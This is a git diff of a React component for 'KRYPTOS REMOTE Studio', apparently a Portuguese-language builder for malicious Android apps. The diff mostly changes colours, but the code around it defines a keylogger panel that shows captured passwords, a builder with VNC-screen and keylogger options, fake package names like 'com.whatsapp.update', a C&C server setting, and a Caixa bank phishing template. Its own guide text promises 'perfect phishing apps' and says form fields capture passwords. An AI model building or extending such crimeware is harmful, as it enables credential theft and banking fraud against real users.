           { id: generateId(), type: 'text', x: 195, y: 118, width: 140, height: 30, content: '{{total_cards}}', fontSize: 28, fontWeight: 'bold', color: '#00d4aa', opacity: 100, isDynamic: true },
           // Captura 1 - DINÂMICA
           { id: generateId(), type: 'text', x: 20, y: 170, width: 200, height: 20, content: '📋 Últimas Capturas', fontSize: 14, fontWeight: 'bold', color: '#ffffff', opacity: 100 },
-          { id: generateId(), type: 'card', x: 15, y: 200, width: 330, height: 90, backgroundColor: '#2e0d08', borderRadius: 12, borderWidth: 2, borderColor: '#ff6600', opacity: 100 },
+          { id: generateId(), type: 'card', x: 15, y: 200, width: 330, height: 90, backgroundColor: '#121214', borderRadius: 12, borderWidth: 2, borderColor: '#ff6600', opacity: 100 },
           { id: generateId(), type: 'text', x: 25, y: 210, width: 200, height: 22, content: '🏦 {{keylog_1_app}}', fontSize: 14, fontWeight: 'bold', color: '#ff6600', opacity: 100, isDynamic: true },
           { id: generateId(), type: 'text', x: 25, y: 235, width: 200, height: 18, content: '{{keylog_1_device}} • {{keylog_1_time}}', fontSize: 11, color: '#888888', opacity: 100, isDynamic: true },
           { id: generateId(), type: 'text', x: 25, y: 258, width: 150, height: 22, content: 'Senha: {{keylog_1_value}}', fontSize: 14, fontWeight: 'bold', color: '#00d4aa', opacity: 100, isDynamic: true },
           { id: generateId(), type: 'button', x: 270, y: 230, width: 60, height: 35, content: '📋', fontSize: 18, backgroundColor: '#333333', borderRadius: 8, opacity: 100 },
           // Captura 2 - DINÂMICA
-          { id: generateId(), type: 'card', x: 15, y: 300, width: 330, height: 80, backgroundColor: '#2e0d08', borderRadius: 12, opacity: 100 },
+          { id: generateId(), type: 'card', x: 15, y: 300, width: 330, height: 80, backgroundColor: '#121214', borderRadius: 12, opacity: 100 },
           { id: generateId(), type: 'text', x: 25, y: 310, width: 200, height: 22, content: '📱 {{keylog_2_app}}', fontSize: 14, fontWeight: 'bold', color: '#25d366', opacity: 100, isDynamic: true },
           { id: generateId(), type: 'text', x: 25, y: 335, width: 250, height: 18, content: '{{keylog_2_device}} • {{keylog_2_time}}', fontSize: 11, color: '#888888', opacity: 100, isDynamic: true },
           { id: generateId(), type: 'text', x: 25, y: 355, width: 200, height: 18, content: 'Valor: {{keylog_2_value}}', fontSize: 12, color: '#00d4aa', opacity: 100, isDynamic: true },
           { id: generateId(), type: 'button', x: 270, y: 325, width: 60, height: 35, content: '📋', fontSize: 18, backgroundColor: '#333333', borderRadius: 8, opacity: 100 },
           // Captura 3 - DINÂMICA
-          { id: generateId(), type: 'card', x: 15, y: 390, width: 330, height: 80, backgroundColor: '#2e0d08', borderRadius: 12, opacity: 100 },
+          { id: generateId(), type: 'card', x: 15, y: 390, width: 330, height: 80, backgroundColor: '#121214', borderRadius: 12, opacity: 100 },
           { id: generateId(), type: 'text', x: 25, y: 400, width: 200, height: 22, content: '📧 {{keylog_3_app}}', fontSize: 14, fontWeight: 'bold', color: '#ea4335', opacity: 100, isDynamic: true },
           { id: generateId(), type: 'text', x: 25, y: 425, width: 250, height: 18, content: '{{keylog_3_device}} • {{keylog_3_time}}', fontSize: 11, color: '#888888', opacity: 100, isDynamic: true },
           { id: generateId(), type: 'text', x: 25, y: 445, width: 200, height: 18, content: 'Valor: {{keylog_3_value}}', fontSize: 12, color: '#00d4aa', opacity: 100, isDynamic: true },
           { id: generateId(), type: 'button', x: 270, y: 415, width: 60, height: 35, content: '📋', fontSize: 18, backgroundColor: '#333333', borderRadius: 8, opacity: 100 },
           // Captura 4 - DINÂMICA
-          { id: generateId(), type: 'card', x: 15, y: 480, width: 330, height: 70, backgroundColor: '#2e0d08', borderRadius: 12, opacity: 100 },
+          { id: generateId(), type: 'card', x: 15, y: 480, width: 330, height: 70, backgroundColor: '#121214', borderRadius: 12, opacity: 100 },
           { id: generateId(), type: 'text', x: 25, y: 490, width: 200, height: 22, content: '🆔 {{keylog_4_app}}', fontSize: 14, fontWeight: 'bold', color: '#ffffff', opacity: 100, isDynamic: true },
           { id: generateId(), type: 'text', x: 25, y: 515, width: 200, height: 22, content: '{{keylog_4_value}}', fontSize: 16, fontWeight: 'bold', color: '#ff6600', opacity: 100, isDynamic: true },
           { id: generateId(), type: 'button', x: 270, y: 500, width: 60, height: 35, content: '📋', fontSize: 18, backgroundColor: '#333333', borderRadius: 8, opacity: 100 },
@@ -642,7 +642,7 @@ const APKStudio: React.FC = () => {
           { id: generateId(), type: 'button', x: 15, y: 570, width: 160, height: 50, content: '📥 Exportar CSV', fontSize: 14, fontWeight: 'bold', color: '#ffffff', backgroundColor: '#333333', borderRadius: 12, buttonAction: 'download', opacity: 100 },
           { id: generateId(), type: 'button', x: 185, y: 570, width: 160, height: 50, content: '🗑️ Limpar Tudo', fontSize: 14, fontWeight: 'bold', color: '#ffffff', backgroundColor: '#ff444444', borderRadius: 12, buttonAction: 'submit', opacity: 100 },
           // Bottom Nav
-          { id: generateId(), type: 'rectangle', x: 0, y: 695, width: 360, height: 85, backgroundColor: '#2e0d08', opacity: 100 },
+          { id: generateId(), type: 'rectangle', x: 0, y: 695, width: 360, height: 85, backgroundColor: '#121214', opacity: 100 },
           { id: generateId(), type: 'button', x: 25, y: 710, width: 55, height: 55, content: '🏠', fontSize: 24, backgroundColor: '#333333', borderRadius: 14, buttonAction: 'goto_screen', targetScreenIndex: 1, opacity: 100 },
           { id: generateId(), type: 'button', x: 95, y: 710, width: 55, height: 55, content: '📱', fontSize: 24, backgroundColor: '#333333', borderRadius: 14, buttonAction: 'goto_screen', targetScreenIndex: 2, opacity: 100 },
           { id: generateId(), type: 'button', x: 165, y: 710, width: 55, height: 55, content: '⌨️', fontSize: 24, backgroundColor: '#e63946', borderRadius: 14, opacity: 100 },
@@ -667,15 +667,15 @@ const APKStudio: React.FC = () => {
           { id: generateId(), type: 'button', x: 185, y: 120, width: 160, height: 70, content: '💳 Phishing\nBancário', fontSize: 14, fontWeight: 'bold', color: '#ffffff', backgroundColor: '#333333', borderRadius: 14, opacity: 100 },
           // Nome
           { id: generateId(), type: 'text', x: 20, y: 210, width: 200, height: 20, content: '📱 Nome do APK', fontSize: 14, fontWeight: 'bold', color: '#ffffff', opacity: 100 },
-          { id: generateId(), type: 'input', x: 15, y: 240, width: 330, height: 55, placeholder: 'Ex: WhatsApp Atualização', inputType: 'text', inputLabel: 'apk_name', backgroundColor: '#2e0d08', color: '#ffffff', borderRadius: 12, borderWidth: 1, borderColor: '#333', opacity: 100 },
+          { id: generateId(), type: 'input', x: 15, y: 240, width: 330, height: 55, placeholder: 'Ex: WhatsApp Atualização', inputType: 'text', inputLabel: 'apk_name', backgroundColor: '#121214', color: '#ffffff', borderRadius: 12, borderWidth: 1, borderColor: '#333', opacity: 100 },
           // Package
           { id: generateId(), type: 'text', x: 20, y: 315, width: 200, height: 20, content: '📦 Package Name', fontSize: 14, fontWeight: 'bold', color: '#ffffff', opacity: 100 },
-          { id: generateId(), type: 'input', x: 15, y: 345, width: 330, height: 55, placeholder: 'com.whatsapp.update', inputType: 'text', inputLabel: 'package_name', backgroundColor: '#2e0d08', color: '#ffffff', borderRadius: 12, borderWidth: 1, borderColor: '#333', opacity: 100 },
+          { id: generateId(), type: 'input', x: 15, y: 345, width: 330, height: 55, placeholder: 'com.whatsapp.update', inputType: 'text', inputLabel: 'package_name', backgroundColor: '#121214', color: '#ffffff', borderRadius: 12, borderWidth: 1, borderColor: '#333', opacity: 100 },
           // Ícone
           { id: generateId(), type: 'text', x: 20, y: 420, width: 200, height: 20, content: '🎨 Ícone do APK', fontSize: 14, fontWeight: 'bold', color: '#ffffff', opacity: 100 },
-          { id: generateId(), type: 'button', x: 15, y: 450, width: 330, height: 55, content: '📤 Fazer Upload do Ícone', fontSize: 14, color: '#888888', backgroundColor: '#2e0d08', borderRadius: 12, borderWidth: 1, borderColor: '#333', opacity: 100 },
+          { id: generateId(), type: 'button', x: 15, y: 450, width: 330, height: 55, content: '📤 Fazer Upload do Ícone', fontSize: 14, color: '#888888', backgroundColor: '#121214', borderRadius: 12, borderWidth: 1, borderColor: '#333', opacity: 100 },
           // Opções
-          { id: generateId(), type: 'card', x: 15, y: 525, width: 330, height: 120, backgroundColor: '#2e0d08', borderRadius: 14, opacity: 100 },
+          { id: generateId(), type: 'card', x: 15, y: 525, width: 330, height: 120, backgroundColor: '#121214', borderRadius: 14, opacity: 100 },
           { id: generateId(), type: 'text', x: 30, y: 540, width: 200, height: 20, content: '⚙️ Funcionalidades', fontSize: 14, fontWeight: 'bold', color: '#ffffff', opacity: 100 },
           { id: generateId(), type: 'checkbox', x: 30, y: 570, width: 140, height: 25, content: '📺 VNC Screen', color: '#ffffff', checked: true, opacity: 100 },
           { id: generateId(), type: 'checkbox', x: 180, y: 570, width: 140, height: 25, content: '⌨️ Keylogger', color: '#ffffff', checked: true, opacity: 100 },
@@ -699,7 +699,7 @@ const APKStudio: React.FC = () => {
           { id: generateId(), type: 'button', x: 15, y: 20, width: 40, height: 35, content: '←', fontSize: 20, backgroundColor: '#983c7d40', borderRadius: 10, buttonAction: 'prev_screen', opacity: 100 },
           { id: generateId(), type: 'text', x: 70, y: 22, width: 250, height: 30, content: '🎨 APK Personalizado', fontSize: 18, fontWeight: 'bold', color: '#ffffff', opacity: 100 },
           // Descrição
-          { id: generateId(), type: 'card', x: 15, y: 85, width: 330, height: 80, backgroundColor: '#2e0d08', borderRadius: 14, opacity: 100 },
+          { id: generateId(), type: 'card', x: 15, y: 85, width: 330, height: 80, backgroundColor: '#121214', borderRadius: 14, opacity: 100 },
           { id: generateId(), type: 'text', x: 30, y: 100, width: 290, height: 50, content: 'Monte telas customizadas com editor visual. Crie apps de phishing perfeitos!', fontSize: 13, color: '#888888', textAlign: 'center', opacity: 100 },
           // Preview área
           { id: generateId(), type: 'text', x: 20, y: 180, width: 200, height: 20, content: '📱 Preview do App', fontSize: 14, fontWeight: 'bold', color: '#ffffff', opacity: 100 },
@@ -729,29 +729,29 @@ const APKStudio: React.FC = () => {
         backgroundColor: '#150503',
         elements: [
           // Header
-          { id: generateId(), type: 'rectangle', x: 0, y: 0, width: 360, height: 70, backgroundColor: '#2e0d08', opacity: 100 },
+          { id: generateId(), type: 'rectangle', x: 0, y: 0, width: 360, height: 70, backgroundColor: '#121214', opacity: 100 },
           { id: generateId(), type: 'button', x: 15, y: 20, width: 40, height: 35, content: '←', fontSize: 20, backgroundColor: '#333333', borderRadius: 10, buttonAction: 'prev_screen', opacity: 100 },
           { id: generateId(), type: 'text', x: 70, y: 22, width: 200, height: 30, content: '⚙️ Configurações', fontSize: 20, fontWeight: 'bold', color: '#ffffff', opacity: 100 },
           // Servidor
           { id: generateId(), type: 'text', x: 20, y: 90, width: 200, height: 20, content: '🌐 Servidor C&C', fontSize: 14, fontWeight: 'bold', color: '#ffffff', opacity: 100 },
-          { id: generateId(), type: 'card', x: 15, y: 115, width: 330, height: 80, backgroundColor: '#2e0d08', borderRadius: 12, opacity: 100 },
+          { id: generateId(), type: 'card', x: 15, y: 115, width: 330, height: 80, backgroundColor: '#121214', borderRadius: 12, opacity: 100 },
           { id: generateId(), type: 'text', x: 30, y: 130, width: 290, height: 20, content: 'https://seu-servidor.com', fontSize: 14, color: '#00d4aa', opacity: 100 },
           { id: generateId(), type: 'text', x: 30, y: 160, width: 150, height: 20, content: '🟢 Conectado', fontSize: 12, color: '#00ff00', opacity: 100 },
           { id: generateId(), type: 'button', x: 250, y: 145, width: 80, height: 35, content: 'Editar', fontSize: 12, backgroundColor: '#333333', borderRadius: 8, opacity: 100 },
           // Notificações
           { id: generateId(), type: 'text', x: 20, y: 215, width: 200, height: 20, content: '🔔 Notificações', fontSize: 14, fontWeight: 'bold', color: '#ffffff', opacity: 100 },
-          { id: generateId(), type: 'card', x: 15, y: 240, width: 330, height: 130, backgroundColor: '#2e0d08', borderRadius: 12, opacity: 100 },
+          { id: generateId(), type: 'card', x: 15, y: 240, width: 330, height: 130, backgroundColor: '#121214', borderRadius: 12, opacity: 100 },
           { id: generateId(), type: 'switch', x: 30, y: 260, width: 280, height: 30, content: 'Novo dispositivo conectado', color: '#ffffff', checked: true, opacity: 100 },
           { id: generateId(), type: 'switch', x: 30, y: 300, width: 280, height: 30, content: 'Senha capturada', color: '#ffffff', checked: true, opacity: 100 },
           { id: generateId(), type: 'switch', x: 30, y: 340, width: 280, height: 30, content: 'Dispositivo offline', color: '#ffffff', checked: false, opacity: 100 },
           // Segurança
           { id: generateId(), type: 'text', x: 20, y: 390, width: 200, height: 20, content: '🔒 Segurança', fontSize: 14, fontWeight: 'bold', color: '#ffffff', opacity: 100 },
-          { id: generateId(), type: 'card', x: 15, y: 415, width: 330, height: 100, backgroundColor: '#2e0d08', borderRadius: 12, opacity: 100 },
+          { id: generateId(), type: 'card', x: 15, y: 415, width: 330, height: 100, backgroundColor: '#121214', borderRadius: 12, opacity: 100 },
           { id: generateId(), type: 'switch', x: 30, y: 435, width: 280, height: 30, content: 'Autenticação biométrica', color: '#ffffff', checked: true, opacity: 100 },
           { id: generateId(), type: 'switch', x: 30, y: 475, width: 280, height: 30, content: 'Criptografar dados locais', color: '#ffffff', checked: true, opacity: 100 },
           // Conta
           { id: generateId(), type: 'text', x: 20, y: 535, width: 200, height: 20, content: '👤 Conta', fontSize: 14, fontWeight: 'bold', color: '#ffffff', opacity: 100 },
-          { id: generateId(), type: 'card', x: 15, y: 560, width: 330, height: 70, backgroundColor: '#2e0d08', borderRadius: 12, opacity: 100 },
+          { id: generateId(), type: 'card', x: 15, y: 560, width: 330, height: 70, backgroundColor: '#121214', borderRadius: 12, opacity: 100 },
           { id: generateId(), type: 'text', x: 30, y: 575, width: 200, height: 20, content: 'admin', fontSize: 16, fontWeight: 'bold', color: '#ffffff', opacity: 100 },
           { id: generateId(), type: 'text', x: 30, y: 600, width: 200, height: 18, content: 'Licença: Premium ✓', fontSize: 12, color: '#00d4aa', opacity: 100 },
           { id: generateId(), type: 'button', x: 240, y: 575, width: 90, height: 40, content: 'Sair', fontSize: 14, color: '#ff4444', backgroundColor: '#ff444420', borderRadius: 8, buttonAction: 'goto_screen', targetScreenIndex: 0, opacity: 100 },
@@ -759,7 +759,7 @@ const APKStudio: React.FC = () => {
           { id: generateId(), type: 'text', x: 20, y: 650, width: 320, height: 20, content: 'KRYPTOS REMOTE v2.0.0', fontSize: 12, color: '#444444', textAlign: 'center', opacity: 100 },
           { id: generateId(), type: 'text', x: 20, y: 675, width: 320, height: 20, content: '© 2024 - Todos os direitos reservados', fontSize: 10, color: '#333333', textAlign: 'center', opacity: 100 },
           // Bottom Nav
-          { id: generateId(), type: 'rectangle', x: 0, y: 695, width: 360, height: 85, backgroundColor: '#2e0d08', opacity: 100 },
+          { id: generateId(), type: 'rectangle', x: 0, y: 695, width: 360, height: 85, backgroundColor: '#121214', opacity: 100 },
           { id: generateId(), type: 'button', x: 25, y: 710, width: 55, height: 55, content: '🏠', fontSize: 24, backgroundColor: '#333333', borderRadius: 14, buttonAction: 'goto_screen', targetScreenIndex: 1, opacity: 100 },
           { id: generateId(), type: 'button', x: 95, y: 710, width: 55, height: 55, content: '📱', fontSize: 24, backgroundColor: '#333333', borderRadius: 14, buttonAction: 'goto_screen', targetScreenIndex: 2, opacity: 100 },
           { id: generateId(), type: 'button', x: 165, y: 710, width: 55, height: 55, content: '⌨️', fontSize: 24, backgroundColor: '#333333', borderRadius: 14, buttonAction: 'goto_screen', targetScreenIndex: 4, opacity: 100 },
@@ -839,7 +839,7 @@ const APKStudio: React.FC = () => {
       screens: getVictimScreens(),
       panelScreens: getPanelScreens(),
       theme: type === 'rat' || type === 'hybrid'
-        ? { ...DEFAULT_THEME, primaryColor: '#238636', accentColor: '#ffa658', backgroundColor: '#0d1117' }
+        ? { ...DEFAULT_THEME, primaryColor: '#238636', accentColor: '#ffa658', backgroundColor: '#170d0d' }
         : type === 'mobile_panel' 
           ? { ...DEFAULT_THEME, primaryColor: '#ff6600', accentColor: '#00d4aa' }
           : { ...DEFAULT_THEME },
@@ -990,7 +990,7 @@ const APKStudio: React.FC = () => {
         break;
       case 'caixa':
         screenName = '🏦 Caixa';
-        bgColor = '#005ca9';
+        bgColor = '#a90000';
         elements = [
           { id: generateId(), type: 'rectangle', x: 0, y: 0, width: 360, height: 70, backgroundColor: '#f39200', opacity: 100 },
           { id: generateId(), type: 'text', x: 20, y: 20, width: 320, height: 30, content: 'CAIXA', fontSize: 24, fontWeight: 'bold', color: '#ffffff', textAlign: 'center', opacity: 100 },
@@ -1147,7 +1147,7 @@ const APKStudio: React.FC = () => {
         baseElement.placeholder = 'Digite aqui...';
         baseElement.inputType = 'text';
         baseElement.inputLabel = 'Campo';
-        baseElement.backgroundColor = '#2e0d08';
+        baseElement.backgroundColor = '#121214';
         baseElement.color = '#ffffff';
         baseElement.borderRadius = 8;
         baseElement.borderWidth = 1;
@@ -1175,7 +1175,7 @@ const APKStudio: React.FC = () => {
         break;
         
       case 'card':
-        baseElement.backgroundColor = '#2e0d08';
+        baseElement.backgroundColor = '#121214';
         baseElement.borderRadius = 16;
         baseElement.shadowColor = '#000000';
         baseElement.shadowBlur = 15;
@@ -1195,7 +1195,7 @@ const APKStudio: React.FC = () => {
         break;
         
       case 'audio':
-        baseElement.backgroundColor = '#2e0d08';
+        baseElement.backgroundColor = '#121214';
         baseElement.borderRadius = 25;
         baseElement.autoPlay = false;
         baseElement.loop = false;
@@ -1238,7 +1238,7 @@ const APKStudio: React.FC = () => {
         break;
         
       case 'dropdown':
-        baseElement.backgroundColor = '#2e0d08';
+        baseElement.backgroundColor = '#121214';
         baseElement.color = '#ffffff';
         baseElement.borderRadius = 8;
         baseElement.borderWidth = 1;
@@ -1263,7 +1263,7 @@ const APKStudio: React.FC = () => {
         break;
         
       case 'countdown':
-        baseElement.backgroundColor = '#2e0d08';
+        baseElement.backgroundColor = '#121214';
         baseElement.color = '#ffffff';
         baseElement.fontSize = 32;
         baseElement.fontWeight = 'bold';
@@ -1290,7 +1290,7 @@ const APKStudio: React.FC = () => {
         break;
         
       case 'credit_card_form':
-        baseElement.backgroundColor = '#2e0d08';
+        baseElement.backgroundColor = '#121214';
         baseElement.borderRadius = 16;
         baseElement.borderWidth = 1;
         baseElement.borderColor = '#333333';
@@ -1304,7 +1304,7 @@ const APKStudio: React.FC = () => {
         break;
         
       case 'map':
-        baseElement.backgroundColor = '#2e0d08';
+        baseElement.backgroundColor = '#121214';
         baseElement.borderRadius = 12;
         break;
     }
@@ -1918,23 +1918,23 @@ const APKStudio: React.FC = () => {
     return (
       <div className="min-h-screen bg-[#1e0603] text-slate-100 p-6 font-sans relative overflow-hidden">
         {/* Background radial glows */}
-        <div className="absolute top-0 left-1/4 w-[400px] h-[400px] bg-blue-500/5 rounded-full blur-3xl pointer-events-none"></div>
-        <div className="absolute bottom-10 right-1/4 w-[400px] h-[400px] bg-purple-500/5 rounded-full blur-3xl pointer-events-none"></div>
+        <div className="absolute top-0 left-1/4 w-[400px] h-[400px] bg-[#ef4444]/5 rounded-full blur-3xl pointer-events-none"></div>
+        <div className="absolute bottom-10 right-1/4 w-[400px] h-[400px] bg-[#f87171]/5 rounded-full blur-3xl pointer-events-none"></div>
 
         <div className="max-w-6xl mx-auto relative z-10 space-y-8">
           {/* Header */}
-          <div className="flex items-center justify-between border-b border-blue-500/10 pb-6">
+          <div className="flex items-center justify-between border-b border-[#2a2a31]/10 pb-6">
             <div className="flex items-center gap-4">
               <button
                 onClick={() => navigate('/dashboard')}
-                className="p-2 bg-[#280904] hover:bg-[#501006] border border-blue-500/20 text-cyan-400 rounded-xl transition-colors"
+                className="p-2 bg-[#280904] hover:bg-[#501006] border border-[#2a2a31]/20 text-[#ef4444] rounded-md transition-colors"
                 title="Voltar ao Dashboard"
               >
                 <ArrowLeft className="w-5 h-5" />
               </button>
               <div className="flex items-center gap-4">
                 <div className="relative">
-                  <div className="absolute inset-0 rounded-full bg-cyan-500/15 blur-md animate-pulse"></div>
+                  <div className="absolute inset-0 rounded-full bg-[#ef4444]/15 blur-md animate-pulse"></div>
                   <img 
                     src="/gangstar-logo.svg" 
                     alt="Kryptos Remote" 
@@ -1943,51 +1943,51 @@ const APKStudio: React.FC = () => {
                 </div>
                 <div>
                   <h1 className="text-xl font-black uppercase tracking-widest text-white font-mono">
-                    KRYPTOS <span className="text-cyan-400">REMOTE</span> Studio
+                    KRYPTOS <span className="text-[#ef4444]">REMOTE</span> Studio
                   </h1>
-                  <p className="text-xs text-slate-500 font-mono uppercase tracking-wider">Editor e compilador visual de aplicativos</p>
+                  <p className="text-xs text-[#8b8b94] font-mono uppercase tracking-wider">Editor e compilador visual de aplicativos</p>
                 </div>
               </div>
             </div>
           </div>
 
           {/* Como Funciona Panel (Guia Explicativo) */}
-          <div className="bg-[#280904]/85 border border-blue-500/20 rounded-2xl p-6 relative overflow-hidden">
-            <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-cyan-500/30 to-transparent"></div>
+          <div className="bg-[#280904]/85 border border-[#2a2a31]/20 rounded-md p-6 relative overflow-hidden">
+            <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-[#f87171]/30 to-transparent"></div>
             
             <div className="flex items-center gap-2 mb-4">
-              <HelpCircle size={18} className="text-cyan-400 animate-pulse" />
-              <h2 className="text-xs font-black text-cyan-400 uppercase tracking-widest font-mono">
+              <HelpCircle size={18} className="text-[#ef4444] animate-pulse" />
+              <h2 className="text-xs font-black text-[#ef4444] uppercase tracking-widest font-mono">
                 Como funciona o painel de criação
               </h2>
             </div>
             
             <div className="grid grid-cols-1 md:grid-cols-4 gap-6 text-xs text-slate-400">
-              <div className="bg-[#200703]/60 p-4 rounded-xl border border-blue-500/5 relative">
-                <span className="absolute top-3 right-3 font-mono font-black text-[14px] text-cyan-500/20">01</span>
+              <div className="bg-[#200703]/60 p-4 rounded-md border border-[#2a2a31]/5 relative">
+                <span className="absolute top-3 right-3 font-mono font-black text-[14px] text-[#ef4444]/20">01</span>
                 <h3 className="font-bold text-white mb-1.5 uppercase font-mono tracking-wider">Defina o Escopo</h3>
                 <p className="leading-relaxed">
                   Escolha se deseja um app focado em pagamentos PIX, em controle remoto completo via RAT, ou ambos de forma híbrida.
                 </p>
               </div>
 
-              <div className="bg-[#200703]/60 p-4 rounded-xl border border-blue-500/5 relative">
-                <span className="absolute top-3 right-3 font-mono font-black text-[14px] text-purple-500/20">02</span>
+              <div className="bg-[#200703]/60 p-4 rounded-md border border-[#2a2a31]/5 relative">
+                <span className="absolute top-3 right-3 font-mono font-black text-[14px] text-[#f87171]/20">02</span>
                 <h3 className="font-bold text-white mb-1.5 uppercase font-mono tracking-wider">Crie as Telas</h3>
                 <p className="leading-relaxed">
                   Desenhe o fluxo do aplicativo usando o editor visual: insira campos de formulário, logotipos reais de bancos e botões.
                 </p>
               </div>
 
-              <div className="bg-[#200703]/60 p-4 rounded-xl border border-blue-500/5 relative">
-                <span className="absolute top-3 right-3 font-mono font-black text-[14px] text-rose-500/20">03</span>
+              <div className="bg-[#200703]/60 p-4 rounded-md border border-[#2a2a31]/5 relative">
+                <span className="absolute top-3 right-3 font-mono font-black text-[14px] text-[#ef4444]/20">03</span>
                 <h3 className="font-bold text-white mb-1.5 uppercase font-mono tracking-wider">Mapeie Ações</h3>
                 <p className="leading-relaxed">
                   Ligue os campos a chaves PIX ou a inputs monitorados. Campos identificados capturam chaves e senhas no keylogger instantaneamente.
                 </p>
               </div>
 
-              <div className="bg-[#200703]/60 p-4 rounded-xl border border-blue-500/5 relative">
+              <div className="bg-[#200703]/60 p-4 rounded-md border border-[#2a2a31]/5 relative">
                 <span className="absolute top-3 right-3 font-mono font-black text-[14px] text-emerald-500/20">04</span>
                 <h3 className="font-bold text-white mb-1.5 uppercase font-mono tracking-wider">Gere o APK</h3>
                 <p className="leading-relaxed">
@@ -1998,133 +1998,133 @@ const APKStudio: React.FC = () => {
           </div>
 
           {/* Criar Novo Projeto */}
-          <div className="bg-[#280904]/85 border border-blue-500/20 rounded-2xl p-6 relative overflow-hidden">
-            <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-cyan-500/20 to-transparent"></div>
+          <div className="bg-[#280904]/85 border border-[#2a2a31]/20 rounded-md p-6 relative overflow-hidden">
+            <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-[#f87171]/20 to-transparent"></div>
             <h2 className="text-xs font-black text-slate-450 uppercase tracking-widest mb-6 font-mono flex items-center gap-2">
-              <Layers size={14} className="text-cyan-400" />
+              <Layers size={14} className="text-[#ef4444]" />
               Criar Novo Projeto
             </h2>
             <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-5 gap-4">
               {/* Payment Card */}
               <button
                 onClick={() => createNewProject('payment')}
-                className="group p-5 bg-[#200703]/90 border border-blue-500/15 hover:border-emerald-500/50 hover:bg-[#300b04] rounded-xl text-center transition-all flex flex-col items-center justify-between hover:shadow-[0_0_20px_rgba(16,185,129,0.15)]"
+                className="group p-5 bg-[#200703]/90 border border-[#2a2a31]/15 hover:border-emerald-500/50 hover:bg-[#300b04] rounded-md text-center transition-all flex flex-col items-center justify-between hover:shadow-[0_0_20px_rgba(16,185,129,0.15)]"
               >
-                <div className="w-11 h-11 bg-emerald-950/40 border border-emerald-500/30 rounded-xl flex items-center justify-center mb-4 group-hover:scale-105 transition-transform group-hover:shadow-[0_0_10px_rgba(16,185,129,0.2)]">
+                <div className="w-11 h-11 bg-emerald-950/40 border border-emerald-500/30 rounded-md flex items-center justify-center mb-4 group-hover:scale-105 transition-transform group-hover:shadow-[0_0_10px_rgba(16,185,129,0.2)]">
                   <DollarSign className="w-5 h-5 text-emerald-400" />
                 </div>
                 <div>
                   <span className="font-bold text-white block text-sm uppercase tracking-wide font-mono">Pagamento</span>
-                  <span className="text-[10px] text-slate-500 font-mono uppercase tracking-wider block mt-1">PIX &amp; Gateways</span>
+                  <span className="text-[10px] text-[#8b8b94] font-mono uppercase tracking-wider block mt-1">PIX &amp; Gateways</span>
                 </div>
               </button>
               
               {/* RAT Card */}
               <button
                 onClick={() => createNewProject('rat')}
-                className="group p-5 bg-[#200703]/90 border border-blue-500/15 hover:border-rose-500/50 hover:bg-[#300b04] rounded-xl text-center transition-all flex flex-col items-center justify-between hover:shadow-[0_0_20px_rgba(244,63,94,0.15)]"
+                className="group p-5 bg-[#200703]/90 border border-[#2a2a31]/15 hover:border-[#ef4444]/50 hover:bg-[#300b04] rounded-md text-center transition-all flex flex-col items-center justify-between hover:shadow-[0_0_20px_rgba(244,63,94,0.15)]"
               >
-                <div className="w-11 h-11 bg-rose-950/40 border border-rose-500/30 rounded-xl flex items-center justify-center mb-4 group-hover:scale-105 transition-transform group-hover:shadow-[0_0_10px_rgba(244,63,94,0.2)]">
+                <div className="w-11 h-11 bg-rose-950/40 border border-[#ef4444]/30 rounded-md flex items-center justify-center mb-4 group-hover:scale-105 transition-transform group-hover:shadow-[0_0_10px_rgba(244,63,94,0.2)]">
                   <Smartphone className="w-5 h-5 text-rose-400" />
                 </div>
                 <div>
                   <span className="font-bold text-white block text-sm uppercase tracking-wide font-mono">RAT</span>
-                  <span className="text-[10px] text-slate-500 font-mono uppercase tracking-wider block mt-1">Controle Remoto</span>
+                  <span className="text-[10px] text-[#8b8b94] font-mono uppercase tracking-wider block mt-1">Controle Remoto</span>
                 </div>
               </button>
               
               {/* Hybrid Card */}
               <button
                 onClick={() => createNewProject('hybrid')}
-                className="group p-5 bg-[#200703]/90 border border-blue-500/15 hover:border-purple-500/50 hover:bg-[#300b04] rounded-xl text-center transition-all flex flex-col items-center justify-between hover:shadow-[0_0_20px_rgba(239,68,68,0.15)]"
+                className="group p-5 bg-[#200703]/90 border border-[#2a2a31]/15 hover:border-[#f87171]/50 hover:bg-[#300b04] rounded-md text-center transition-all flex flex-col items-center justify-between hover:shadow-[0_0_20px_rgba(239,68,68,0.15)]"
               >
-                <div className="w-11 h-11 bg-purple-950/40 border border-purple-500/30 rounded-xl flex items-center justify-center mb-4 group-hover:scale-105 transition-transform group-hover:shadow-[0_0_10px_rgba(239,68,68,0.2)]">
-                  <Zap className="w-5 h-5 text-purple-400" />
+                <div className="w-11 h-11 bg-purple-950/40 border border-[#f87171]/30 rounded-md flex items-center justify-center mb-4 group-hover:scale-105 transition-transform group-hover:shadow-[0_0_10px_rgba(239,68,68,0.2)]">
+                  <Zap className="w-5 h-5 text-[#f87171]" />
                 </div>
                 <div>
                   <span className="font-bold text-white block text-sm uppercase tracking-wide font-mono">Híbrido</span>
-                  <span className="text-[10px] text-slate-500 font-mono uppercase tracking-wider block mt-1">Pagamento + RAT</span>
+                  <span className="text-[10px] text-[#8b8b94] font-mono uppercase tracking-wider block mt-1">Pagamento + RAT</span>
                 </div>
               </button>
               
               {/* Custom Card */}
               <button
                 onClick={() => createNewProject('custom')}
-                className="group p-5 bg-[#200703]/90 border border-blue-500/15 hover:border-cyan-400/50 hover:bg-[#300b04] rounded-xl text-center transition-all flex flex-col items-center justify-between hover:shadow-[0_0_20px_rgba(239,68,68,0.15)]"
+                className="group p-5 bg-[#200703]/90 border border-[#2a2a31]/15 hover:border-[#3a3a44]/50 hover:bg-[#300b04] rounded-md text-center transition-all flex flex-col items-center justify-between hover:shadow-[0_0_20px_rgba(239,68,68,0.15)]"
               >
-                <div className="w-11 h-11 bg-cyan-950/40 border border-cyan-500/30 rounded-xl flex items-center justify-center mb-4 group-hover:scale-105 transition-transform group-hover:shadow-[0_0_10px_rgba(239,68,68,0.2)]">
-                  <Palette className="w-5 h-5 text-cyan-400" />
